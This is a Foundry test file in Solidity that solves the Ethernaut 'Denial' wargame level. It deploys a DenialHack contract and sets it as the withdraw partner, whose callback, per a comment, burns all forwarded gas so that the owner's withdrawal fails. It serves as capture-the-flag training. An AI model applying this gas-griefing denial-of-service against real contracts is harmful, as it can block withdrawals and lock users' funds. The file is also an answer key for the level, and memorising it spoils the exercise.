pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Denial/Denial.sol";
import "../Denial/DenialHack.sol";
import "../Denial/DenialFactory.sol";
import "../Ethernaut.sol";

interface CheatCodes {
  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called 
  function startPrank(address) external;
  // Resets subsequent calls' msg.sender to be `address(this)`
  function stopPrank() external;
}

contract DenialTest is DSTest {
    CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    DenialHack denialHack;
    DenialFactory denialFactory;
    address levelAddress;
    bool levelSuccessfullyPassed;

    function setUp() public {
        // Setup instances of the Ethernaut & DenialFactory contracts
        ethernaut = new Ethernaut();
        denialFactory = new DenialFactory();
    }

    function testDenialHack() public {

        // Register the Ethernaut Denial level (this would have already been done on Rinkeby)
        ethernaut.registerLevel(denialFactory);

        // Add some ETH to the 0 address which we will be using 
        payable(address(0)).transfer(3 ether);
        // Use the startPrank cheat which enables us to excute subsequent call as another address (https://onbjerg.github.io/foundry-book/reference/cheatcodes.html)
        cheats.startPrank(address(0));

        // Set up the Level
        levelAddress = ethernaut.createLevelInstance{value: 1 ether}(denialFactory);

        // Cast the level address to the Denial contract class
        Denial ethernautDenial = Denial(payable(levelAddress));

        // Create DenialHack Contract
        denialHack = new DenialHack();
        
        // set withdraw parter. callback function will waste all pased gas when admin calls "withdraw"
        ethernautDenial.setWithdrawPartner(address(denialHack));

        // Submit level to the core Ethernaut contract
        levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));

        // Stop the prank - calls with no longer come from address(0) 
        cheats.stopPrank();

        // Verify the level has passed
        assert(levelSuccessfullyPassed);
    }
}
